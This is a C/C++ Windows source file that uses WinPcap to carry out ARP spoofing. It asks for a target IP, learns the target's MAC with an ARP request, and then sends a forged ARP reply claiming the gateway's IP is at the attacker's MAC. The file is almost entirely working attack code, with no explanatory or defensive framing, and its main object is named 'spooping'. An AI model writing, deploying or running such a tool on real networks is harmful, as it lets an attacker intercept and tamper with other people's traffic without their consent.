#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>  
#include "pcap.h"  
#include <string.h>
#include <winsock2.h>
#include <iptypes.h>
#include <iphlpapi.h>
#include <stdlib.h>
#include <locale.h>

#define ETHERNET_REVERSED 0x100
#define IPv4_REVERSED 0x0008
#define ARP_PROTO_REVERSED 0x0608
#define ARP_PROTO 0x0806
#define REQUEST_REVERSED 0x100
#define REPLY_REVERSED 0x200
#define MAC_LEN 6
#define PRO_LEN 4
#define IP_LEN 4
#pragma comment(lib, "Ws2_32.lib")
#pragma comment (lib, "wpcap.lib")
#pragma comment(lib, "iphlpapi")

unsigned char BROADCAST[6] = { 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF };
bool flag = FALSE;
void normal_arp(u_char *paramn, const struct pcap_pkthdr *header, const u_char *packet);
void mstrncpy(unsigned char* source, unsigned char* target, int num);
void ntoa(const unsigned char* source, unsigned char* target, int len);
void getip(pcap_t* dev_handle);
unsigned char cmp_ip[IP_LEN], cmp_mac[MAC_LEN], request_mac[MAC_LEN];

typedef struct ETH {
	unsigned char	h_dest[MAC_LEN];	/* destination eth addr	*/
	unsigned char	h_source[MAC_LEN];	/* source ether addr	*/
	unsigned short	h_proto;		/* packet type ID field	*/
}ETH;

/* ARP Header, (assuming Ethernet+IPv4)            */
#define ARP_REQUEST 1   /* ARP Request             */ 
#define ARP_REPLY 2     /* ARP Reply               */ 
typedef struct ARP {
	u_int16_t htype;    /* Hardware Type           */
	u_int16_t ptype;    /* Protocol Type           */
	u_char hlen;        /* Hardware Address Length */
	u_char plen;        /* Protocol Address Length */
	u_int16_t oper;     /* Operation Code          */
	u_char sha[MAC_LEN];      /* Sender hardware address */
	u_char spa[IP_LEN];      /* Sender IP address       */
	u_char tha[MAC_LEN];      /* Target hardware address */
	u_char tpa[IP_LEN];      /* Target IP address       */
}ARP;
typedef struct DATA
{
	ETH eth;
	ARP arp;
}DATA;
class control
{
private:
	pcap_t* dev_handle;
	DATA data;
	unsigned char send_mac[MAC_LEN], send_ip[IP_LEN], recv_mac[MAC_LEN], recv_ip[IP_LEN], gw_ip[IP_LEN];
public:
	control(pcap_t* handle);
	void go();
	void send();
	void send_request();
	void get_addresses();
	void input_recv_ip();
	void set_recv_mac(unsigned char* source);
};

int main()
{
	pcap_if_t *dev_list;
	pcap_if_t *dev_tmp;
	pcap_t *dev_handle;
	int input, dev_list_len;
	pcap_findalldevs(&dev_list, (char*)stderr);
	dev_tmp = dev_list;
	for (dev_list_len = 0; dev_tmp != NULL; dev_list_len++)
	{
		printf("%d - %-32s (%s)\n", dev_list_len + 1, dev_tmp->description, dev_tmp->name);
		dev_tmp = dev_tmp->next;
	}
	do
	{
		printf("Select Device : ");
		scanf("%d", &input);
	} while (input < 1 || input >dev_list_len);
	
	dev_tmp = dev_list;
	for (int i = 0; i < input - 1; i++)
		dev_tmp = dev_tmp->next;

	dev_handle = pcap_open_live(dev_tmp->name, 65536, 1, 100, (char*)stderr);

	control spooping(dev_handle);
	spooping.get_addresses();
	spooping.input_recv_ip();

	HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)getip, (LPVOID)dev_handle, 0, NULL);
	spooping.send_request();
	
	while (flag == FALSE);
	

	TerminateProcess(h, 1);
	flag = FALSE;
	spooping.set_recv_mac(request_mac);
	spooping.send();
	pcap_freealldevs(dev_list);

	pcap_close(dev_handle);
	return 0;
}

void normal_arp(u_char *paramn, const struct pcap_pkthdr *header, const u_char *packet)
{
	int type = 0;
	type += packet[12] * 0x100;
	type += packet[13];
	if (type == ARP_PROTO && flag == FALSE)
	{
		for (int i = 0; i < IP_LEN; i++)
			if (packet[i + 28] != cmp_ip[i])
				return;
		for (int i = 0; i < MAC_LEN; i++)
			if (packet[i + 32] != cmp_mac[i])
				return;
		for (int i = 0; i < MAC_LEN; i++)
			request_mac[i] = packet[i + 22];
		Sleep(1); //delay for write memory
		flag = TRUE;
	}
	else
		return;
}
void mstrncpy(unsigned char* source,unsigned char* target, int num)
{
	memcpy(source, target, num);
}
void getip(pcap_t* dev_handle)
{
	pcap_loop(dev_handle, 0, normal_arp, NULL);
}
void ntoa(unsigned char* source, unsigned char* target, int len)
{
	int index[MAC_LEN], count = 0;
	if (len == 4)
	{
		unsigned char* temp = (unsigned char*)malloc(strlen((char*)source) + 1);
		mstrncpy(temp, source, strlen((char*)source) + 1);
		for (int i = 0; count < 3; i++)
		{
			if (temp[i] == '.')
			{
				index[count++] = i;
				temp[i] = NULL;
			}
		}
		for (int i = 0; i < len; i++)
		{
			if (i == 0)
				target[i] = atoi((char*)temp);
			else
				target[i] = atoi((char*)&temp[index[i - 1] + 1]);
		}
		free(temp);
	}
	else if (len == MAC_LEN)
	{
		for (int i = 0; i < MAC_LEN; i++)
		{
			target[i] = 0;
			if ('0' <= source[i * 3] && source[i * 3] <= '9')
				target[i] += (source[i * 3] - '0') * 0x10;
			else if ('a' <= source[i * 3] && source[i * 3] <= 'f')
				target[i] += (source[i * 3] - 'a' + 10) * 0x10;
			else if ('A' <= source[i * 3] && source[i * 3] <= 'F')
				target[i] += (source[i * 3] - 'A' + 10) * 0x10;
			if ('0' <= source[i * 3 + 1] && source[i * 3 + 1] <= '9')
				target[i] += (source[i * 3 + 1] - 0x30);
			else if ('a' <= source[i * 3 + 1] && source[i * 3 + 1] <= 'f')
				target[i] += (source[i * 3 + 1] - 'a' + 10);
			else if ('A' <= source[i * 3 + 1] && source[i * 3 + 1] <= 'F')
				target[i] += (source[i * 3 + 1] - 'A' + 10);
		}
	}
}
control::control(pcap_t* handle)
{
	this->dev_handle = handle;
	data.eth.h_proto = ARP_PROTO_REVERSED;
	data.arp.hlen = MAC_LEN;
	data.arp.plen = PRO_LEN;
	data.arp.htype = ETHERNET_REVERSED;
	data.arp.ptype = IPv4_REVERSED;
	mstrncpy(data.arp.sha, send_mac, MAC_LEN);
}
void control::go()
{
	pcap_sendpacket(dev_handle, (const u_char*)&data, sizeof DATA);
}
void control::send()
{
	mstrncpy(data.eth.h_source, send_mac, MAC_LEN);
	mstrncpy(data.eth.h_dest, recv_mac, MAC_LEN);
	mstrncpy(data.arp.tha, recv_mac, MAC_LEN);
	data.arp.oper = REPLY_REVERSED;
	mstrncpy(data.arp.spa, gw_ip, IP_LEN);
	go();
}
void control::send_request()
{
	for (int i = 0; i < MAC_LEN; i++)
		cmp_mac[i] = send_mac[i];
	for (int i = 0; i < IP_LEN; i++)
		cmp_ip[i] = recv_ip[i];
	mstrncpy(data.eth.h_source, send_mac, 6);
	mstrncpy(data.eth.h_dest, BROADCAST, 6);
	data.arp.oper = REQUEST_REVERSED;
	mstrncpy(data.arp.spa, send_ip, IP_LEN);
	mstrncpy(data.arp.sha, send_mac, MAC_LEN);
	memset(data.arp.tha, 0x00, 6);
	go();
}
void control::get_addresses()
{
	PIP_ADAPTER_INFO temp;
	PIP_ADAPTER_INFO Info;
	DWORD size;
	int result, input, i = 0;
	unsigned char buf[128] = {};

	ZeroMemory(&Info, sizeof(PIP_ADAPTER_INFO));
	size = sizeof(PIP_ADAPTER_INFO);

	result = GetAdaptersInfo(Info, &size);

	if (result == ERROR_BUFFER_OVERFLOW)    // GetAdaptersInfo가 메모리가 부족하면 재 할당하고 재호출
	{
		Info = (PIP_ADAPTER_INFO)malloc(size);

		GetAdaptersInfo(Info, &size);
	}

	printf("\n%-4s%-16s     %-16s%-16s\n", "No,", "MAC", "IP", "GateWay");
	for (temp = Info; temp != NULL; i++, temp = temp->Next)
	{
		printf("%d.  %02x-%02x-%02x-%02x-%02x-%02x    %-16s%-16s\n",
			i + 1,
			temp->Address[0],
			temp->Address[1],
			temp->Address[2],
			temp->Address[3],
			temp->Address[4],
			temp->Address[5],
			temp->IpAddressList.IpAddress.String,
			temp->GatewayList.IpAddress.String);
	}
	printf("Select Addresses : ");
	scanf("%d", &input);
	for (int i = 0; i < input - 1; i++)
		Info = Info->Next;

	sprintf((char*)buf,"%s", Info->IpAddressList.IpAddress.String);
	ntoa(buf, send_ip, IP_LEN);
	sprintf((char*)buf,"%02x:%02x:%02x:%02x:%02x:%02x",
		Info->Address[0],
		Info->Address[1],
		Info->Address[2],
		Info->Address[3],
		Info->Address[4],
		Info->Address[5]);
	ntoa(buf, send_mac, MAC_LEN);
	sprintf((char*)buf,"%s", Info->GatewayList.IpAddress.String);
	ntoa(buf, gw_ip, IP_LEN);
}
void control::input_recv_ip()
{
	unsigned char input_recv_ip[32], recv_ip[IP_LEN];
	printf("\nreceiver IP : ");
	scanf_s("%s", input_recv_ip, 32);
	ntoa(input_recv_ip, recv_ip, IP_LEN);
	mstrncpy(this->recv_ip, recv_ip, IP_LEN);
	mstrncpy(data.arp.tpa, recv_ip, IP_LEN);
	fflush(stdin);
}
void control::set_recv_mac(unsigned char* source)
{
	Sleep(1);
	mstrncpy(recv_mac, source, MAC_LEN);
}